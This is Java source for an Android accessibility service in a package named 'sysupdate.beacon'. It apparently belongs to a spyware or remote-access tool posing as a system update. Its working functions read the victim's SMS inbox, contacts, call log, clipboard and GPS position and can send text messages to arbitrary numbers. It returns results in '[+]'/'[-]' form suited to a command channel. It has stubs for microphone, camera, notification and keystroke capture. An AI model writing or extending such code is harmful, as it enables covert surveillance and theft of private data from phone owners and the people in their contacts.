package com.sysupdate.beacon;

import android.accessibilityservice.AccessibilityService;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract;
import android.provider.CallLog;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import java.io.BufferedWriter;
import java.io.OutputStreamWriter;
import java.util.List;

/**
 * BeaconAccessibilityService - Enhanced beacon variant
 * Requires user to manually enable AccessibilityService in Settings
 * Gives access to: SMS, contacts, call log, notifications, key input
 */
public class BeaconAccessibilityService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Could capture key events here
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onServiceConnected() {
        Log.i("sysupdate", "AccessibilityService connected");
        super.onServiceConnected();
    }

    // ===== SMS FUNCTIONS =====
    public static String readSMS(Context ctx) {
        StringBuilder sb = new StringBuilder();
        try {
            Uri uri = Uri.parse("content://sms/inbox");
            Cursor cursor = ctx.getContentResolver().query(uri,
                    new String[]{"address", "date", "body"}, null, null, "date DESC");
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String addr = cursor.getString(0);
                    String date = cursor.getString(1);
                    String body = cursor.getString(2);
                    sb.append(String.format("%s %s: %s\n", date, addr, body));
                }
                cursor.close();
            }
            return sb.length() > 0 ? sb.toString() : "(no SMS)";
        } catch (Exception e) {
            return "[-] " + e.getMessage();
        }
    }

    public static String sendSMS(Context ctx, String number, String message) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(number, null, message, null, null);
            return "[+] SMS sent to " + number;
        } catch (Exception e) {
            return "[-] " + e.getMessage();
        }
    }

    // ===== CONTACTS =====
    public static String readContacts(Context ctx) {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = ctx.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{ContactsContract.ContactNameColumns.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER},
                    null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(0);
                    String number = cursor.getString(1);
                    sb.append(String.format("%s: %s\n", name, number));
                }
                cursor.close();
            }
            return sb.length() > 0 ? sb.toString() : "(no contacts)";
        } catch (Exception e) {
            return "[-] " + e.getMessage();
        }
    }

    // ===== CALL LOG =====
    public static String readCallLog(Context ctx) {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = ctx.getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    new String[]{CallLog.Calls.NUMBER, CallLog.Calls.DATE,
                            CallLog.Calls.TYPE, CallLog.Calls.DURATION},
                    null, null, CallLog.Calls.DATE + " DESC");
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(0);
                    String date = cursor.getString(1);
                    int type = cursor.getInt(2);
                    String duration = cursor.getString(3);
                    String typeStr = type == CallLog.Calls.INCOMING_TYPE ? "IN" :
                            type == CallLog.Calls.OUTGOING_TYPE ? "OUT" :
                            type == CallLog.Calls.MISSED_TYPE ? "MISSED" : "OTHER";
                    sb.append(String.format("%s %s [%s] %ss\n", date, number, typeStr, duration));
                }
                cursor.close();
            }
            return sb.length() > 0 ? sb.toString() : "(no calls)";
        } catch (Exception e) {
            return "[-] " + e.getMessage();
        }
    }

    // ===== CLIPBOARD =====
    public static String readClipboard(Context ctx) {
        try {
            android.text.ClipboardManager cm =
                    (android.text.ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm != null && cm.hasPrimaryClip()) {
                return cm.getPrimaryClip().getItemAt(0).getText().toString();
            }
            return "(empty clipboard)";
        } catch (Exception e) {
            return "[-] " + e.getMessage();
        }
    }

    // ===== NOTIFICATIONS =====
    public static String getNotifications() {
        // Requires NotificationListenerService
        return "[-] Notification access requires enabling Notification Listener Service";
    }

    // ===== MIC RECORDING =====
    public static String recordAudio(Context ctx, int seconds) {
        // Requires RECORD_AUDIO permission
        return "[-] Microphone recording requires runtime permission";
    }

    // ===== CAMERA =====
    public static String takePhoto(Context ctx, String facing) {
        // Requires CAMERA permission + camera2 API
        return "[-] Camera capture requires CAMERA permission and camera2 API implementation";
    }

    // ===== GPS =====
    public static String getLocation(Context ctx) {
        // Requires ACCESS_FINE_LOCATION
        android.location.LocationManager lm =
                (android.location.LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        try {
            android.location.Location loc = lm.getLastKnownLocation(
                    android.location.LocationManager.GPS_PROVIDER);
            if (loc != null) {
                return String.format("lat: %.6f, lon: %.6f, alt: %.1f", loc.getLatitude(),
                        loc.getLongitude(), loc.getAltitude());
            }
            return "[-] No GPS fix";
        } catch (Exception e) {
            return "[-] " + e.getMessage();
        }
    }
}
